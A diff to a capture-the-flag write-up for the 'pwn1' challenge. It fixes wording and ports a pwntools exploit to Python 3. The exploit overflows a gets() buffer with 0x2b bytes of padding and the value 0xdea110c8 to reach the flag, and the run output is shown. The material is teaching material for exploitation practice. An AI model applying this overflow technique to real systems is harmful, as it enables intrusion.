@@ -59,7 +59,7 @@ undefined4 main(void)
 }
 ```
 
-So right off the back, we can see we are dealing with a reference to one of the greatest movies ever (Monty Python and the Holy Grail). We can see that it will scan in input into `input` using `fgets`, then compares our input with `strcmp`. It does this twice. The first time it checks for the string `Sir Lancelot of Camelot\n` and the second time it checks for the string `To seek the Holy Grail.\n`. If we don't pass the check the first time, it will print `I don\'t know that! Auuuuuuuugh!` and exit. For the second check if we pass it, the code will call the function `gets` with `input` as an argument. The function `gets` will scan in data until it either gets a newline character or an EOF. As a result on paper there is no limit to how much it can scan into memory. Since the are it is scanning into is finite, we will be able to overflow it and start overwriting subsequent things in memory.
+So right off the back, we can see we are dealing with a reference to one of the greatest movies ever (Monty Python and the Holy Grail). We can see that it will scan input into `input` using `fgets`, then compares our input with `strcmp`. It does this twice. The first time it checks for the string `Sir Lancelot of Camelot\n` and the second time it checks for the string `To seek the Holy Grail.\n`. If we don't pass the check the first time, it will print `I don\'t know that! Auuuuuuuugh!` and exit. For the second check if we pass it, the code will call the function `gets` with `input` as an argument. The function `gets` will scan in data until it either gets a newline character or an EOF. As a result, on paper there is no limit to how much it can scan into memory. Since the area it is scanning into is finite, we will be able to overflow it and start overwriting subsequent things in memory.
 
 Also looking at the assembly code for around the `gets` call, we see something interesting that the decompiled code doesn't show us:
 ```
@@ -128,19 +128,19 @@ So we can see that `input` starts at offset `-0x43`. We see that `local_18` star
 
 ```
 # Import pwntools
-from pwn import *
+from pwn import process, p32
 
 # Establish the target process
 target = process('./pwn1')
 
 # Make the payload
-payload = ""
-payload += "0"*0x2b # Padding to `local_18`
-payload += p32(0xdea110c8) # the value we will overwrite local_18 with, in little endian
+payload = b""
+payload += b"0"*0x2b # Padding to `local_18`
+payload += p32(0xdea110c8) # The value we will overwrite local_18 with, in little endian
 
 # Send the strings to reach the gets call
-target.sendline("Sir Lancelot of Camelot")
-target.sendline("To seek the Holy Grail.")
+target.sendline(b"Sir Lancelot of Camelot")
+target.sendline(b"To seek the Holy Grail.")
 
 # Send the payload
 target.sendline(payload)
@@ -150,20 +150,20 @@ target.interactive()
 
 When we run it:
 ```
-$    python exploit.py
-[+] Starting local process './pwn1': pid 12060
+$ python3 exploit.py 
+[+] Starting local process './pwn1': pid 6006
 [*] Switching to interactive mode
-[*] Process './pwn1' stopped with exit code 0 (pid 12060)
 Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
 What... is your name?
 What... is your quest?
 What... is my secret?
 Right. Off you go.
+[*] Process './pwn1' stopped with exit code 0 (pid 6006)
 flag{g0ttem_b0yz}
 
 [*] Got EOF while reading in interactive
-$
-[*] Got EOF while sending in interactive
+$ 
+[*] Interrupted
 ```
 
 Just like that, we got the flag!
